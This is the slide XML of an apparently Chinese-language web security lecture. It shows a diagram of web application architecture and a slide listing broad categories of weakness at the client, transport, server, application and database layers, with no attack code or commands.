          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512" anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>HTTP/HTTPS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>请求</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408609" name="AutoShape 33"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="4365625"/>
            <a:ext cx="914400" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 43231"/>
              <a:gd name="adj2" fmla="val -94125"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>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FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>明文或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SSL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408610" name="AutoShape 34"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1908175" y="4373563"/>
            <a:ext cx="1368425" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 12296"/>
              <a:gd name="adj2" fmla="val -111269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512" anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>响应</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>( HTML, JavaScript, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408612" name="AutoShape 36"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2987675" y="1773238"/>
            <a:ext cx="1219200" cy="990600"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -8204"/>
              <a:gd name="adj2" fmla="val 90384"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Apache</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IIS</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etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408613" name="AutoShape 37"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3779838" y="4652963"/>
            <a:ext cx="838200" cy="1889125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 60417"/>
              <a:gd name="adj2" fmla="val -85125"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Perl</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C++</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CGI</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Java</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ASP</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PHP</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etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408614" name="AutoShape 38"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6227763" y="5157788"/>
            <a:ext cx="1008062" cy="1133475"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 38977"/>
              <a:gd name="adj2" fmla="val -96500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>ADO</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ODBC</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JDBC</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etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408615" name="AutoShape 39"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6804025" y="1341438"/>
            <a:ext cx="1512888" cy="863600"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 27648"/>
              <a:gd name="adj2" fmla="val 96690"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Oracle</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SQL Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">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8607"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4086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8608"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4086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8609"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="40860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8610"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4086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8612"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4086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8613"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4086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08614"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4086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08615"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="408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607" grpId="0" animBg="1"/>
      <p:bldP spid="408608" grpId="0" animBg="1"/>
      <p:bldP spid="408609" grpId="0" animBg="1"/>
      <p:bldP spid="408610" grpId="0" animBg="1"/>
      <p:bldP spid="408612" grpId="0" animBg="1"/>
      <p:bldP spid="408613" grpId="0" animBg="1"/>
      <p:bldP spid="408614" grpId="0" animBg="1"/>
      <p:bldP spid="4086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ltLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>应用体系结构潜在弱点</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="451587" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658812" y="1623435"/>
            <a:ext cx="8083406" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>客户端</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>活动内容执行，客户端软件漏洞的利用，交互站点脚本的错误</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>传输</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>偷听客户</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器通信，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>重定向</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>服务器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器软件漏洞；</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1587">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="451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1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1587">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="451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1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1587">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="451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1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1587">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="451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1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51587">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4515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15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51587">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4515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515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ltLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>应用体系结构潜在弱点</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="451587" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="617248" y="1554163"/>
            <a:ext cx="8083406" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应用程序</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击授权、认证、站点结构、输入验证，以及应用程序逻辑</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>数据库</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
